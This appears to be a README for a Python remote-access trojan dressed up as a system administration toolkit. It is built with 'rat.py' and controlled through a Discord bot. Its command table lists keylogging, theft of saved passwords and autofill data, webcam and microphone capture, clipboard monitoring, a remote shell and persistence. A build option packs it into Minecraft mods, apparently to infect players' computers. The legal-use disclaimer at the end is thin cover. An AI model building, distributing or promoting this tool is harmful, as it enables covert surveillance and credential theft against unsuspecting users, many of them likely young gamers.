\# RemoteAdmin-Toolkit



A Python-based remote administration and system management toolkit for Windows environments.



\## Features



\- Remote command execution

\- System diagnostics

\- Desktop capture

\- Input monitoring

\- Browser data recovery

\- Network analysis

\- WiFi profile management

\- IP geolocation

\- File transfer

\- Startup management

\- Service control

\- Registry viewer

\- Scheduled task management

\- Minecraft mod integration



\## Requirements



\- Python 3.8+

\- Windows 10/11

\- Java JDK 17+ (for Minecraft mod integration)

\- PyInstaller (for EXE compilation)



\## Installation



\### 1. Clone the repository



git clone https://github.com/supanigaqrtz/RemoteAdmin-Toolkit.git

cd RemoteAdmin-Toolkit



\### 2. Install dependencies



pip install -r requirements.txt



\## Usage



\### Basic Build



python rat.py build BOT\_TOKEN CHANNEL\_ID --exe --mod



\### Build Options



| Flag | Description |

| --- | --- |

| --exe | Compile to standalone EXE |

| --mod | Build Minecraft mod integration |

| --mc-version=1.20.4 | Target Minecraft version |



\### Discord Bot Setup



1\. Go to Discord Developer Portal

2\. Create a new application

3\. Go to the Bot section

4\. Create a bot token

5\. Enable Privileged Gateway Intents

6\. Invite the bot to your server



\### Bot Permissions



For full functionality, the bot should have:



\- Administrator (recommended)

\- Manage Channels

\- Read Messages

\- Send Messages

\- Attach Files

\- Read Message History



\## Commands



| Command | Description |

| --- | --- |

| !ping | Check connection status |

| !sysinfo | View system information |

| !location | View IP geolocation |

| !screenshot | Capture desktop |

| !desktop | Start desktop monitoring |

| !inputstart | Start input monitoring |

| !inputdump | View input log |

| !inputstop | Stop input monitoring |

| !clipboard | Start clipboard monitoring |

| !history | View browser history |

| !autofill | View autofill data |

| !passwords | View saved credentials |

| !webcam | Capture webcam |

| !camstart | Start webcam monitoring |

| !mic | Record microphone |

| !wifi | View WiFi profiles |

| !network | Scan local network |

| !persist | Install startup entry |

| !cleanup | Remove startup entry |

| !shutdown | Terminate session |

| !startall | Activate all monitoring |

| !openfile | Open file remotely |

| !openurl | Open URL remotely |

| !registry | View registry summary |

| !download | Download file |

| !upload | Upload file |

| !shell | Execute command |



Full command list: !help



\## Minecraft Mod Integration



The toolkit can integrate with Minecraft Fabric mods for remote management of gaming systems.



\### Requirements



\- Java JDK 17+

\- Fabric Loader 0.19.3+

\- Fabric API 0.97.3+



\### Usage



python rat.py build BOT\_TOKEN CHANNEL\_ID --exe --mod --mc-version=1.20.4



\## Legal Use



This software is intended solely for the administration and management of systems you own or have explicit written authorization to access. Unauthorized access to computer systems is illegal. The author assumes no liability for misuse.



\## License



This project is closed source. Free to use for internal IT administration purposes. Redistribution, modification, and commercial use are prohibited. See LICENSE for details.

